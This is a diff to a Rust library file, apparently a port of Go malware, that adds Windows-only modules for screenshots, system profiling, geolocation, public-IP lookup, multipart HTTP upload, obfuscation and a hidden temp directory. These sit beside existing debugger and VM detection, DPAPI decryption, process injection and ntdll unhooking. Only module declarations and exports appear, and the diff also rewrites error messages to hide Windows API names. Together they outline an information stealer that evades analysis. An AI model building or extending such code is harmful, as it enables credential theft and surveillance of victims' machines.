@@ -24,7 +24,11 @@ pub mod detect;
 #[cfg(windows)]
 pub mod dpapi;
 #[cfg(windows)]
+pub mod http;
+#[cfg(windows)]
 pub mod injector;
+#[cfg(windows)]
+pub mod obfu;
 #[cfg(windows)]
 pub mod patch;
 #[cfg(windows)]
@@ -34,15 +38,23 @@ pub mod pe;
 #[cfg(windows)]
 pub mod resolve;
 #[cfg(windows)]
+pub mod screenshot;
+#[cfg(windows)]
+pub mod sysinfo;
+#[cfg(windows)]
 pub mod unhook;
 #[cfg(windows)]
 pub mod winpaths;
+
+pub mod workdir;
 #[cfg(windows)]
 pub use console::{configure_double_click_mode, hide_console_window, launched_by_explorer};
 #[cfg(windows)]
 pub use detect::{debugger_detected, evasion_check, vm_detected};
 #[cfg(windows)]
 pub use dpapi::{decrypt_dpapi, protect_dpapi};
+#[cfg(windows)]
+pub use http::{GeoInfo, HttpError, build_multipart, geo_info, post_multipart, public_ip};
 #[cfg(windows)]
 pub use injector::{InjectError, Injector, inject};
 #[cfg(windows)]
@@ -54,22 +66,28 @@ pub use pe::{PeArch, PeError, detect_pe_arch, find_export_file_offset};
 #[cfg(windows)]
 pub use resolve::{api, hash_bytes, module_base};
 #[cfg(windows)]
+pub use screenshot::{ScreenshotError, screenshot_png};
+#[cfg(windows)]
+pub use sysinfo::{DiskInfo, MachineInfo, machine_info};
+#[cfg(windows)]
 pub use unhook::{hooked_bytes, unhook_ntdll};
 #[cfg(windows)]
 pub use winpaths::{AbeKind, WinpathError, executable_path};
+
+pub use workdir::hidden_temp_dir;
 
 /// Errors produced by the WinAPI surface (all variants carry the raw OS error).
 #[derive(Debug, thiserror::Error)]
 pub enum AbiError {
     /// Go: `CryptUnprotectData: %w` (dpapi_windows.go).
-    #[error("CryptUnprotectData: {0}")]
+    #[error("unprotect data: {0}")]
     CryptUnprotectData(windows::core::Error),
     /// Go: `CryptProtectData: %w` (inverse path, used for test fixtures).
-    #[error("CryptProtectData: {0}")]
+    #[error("protect data: {0}")]
     CryptProtectData(windows::core::Error),
     /// Go: `LocalFree` is called without error checking, but a failure here means
     /// the freed pointer is gone while the failure itself is only observable via
     /// the returned handle — treated as fatal for the operation.
-    #[error("LocalFree: {0}")]
+    #[error("free memory: {0}")]
     LocalFree(windows::core::Error),
 }
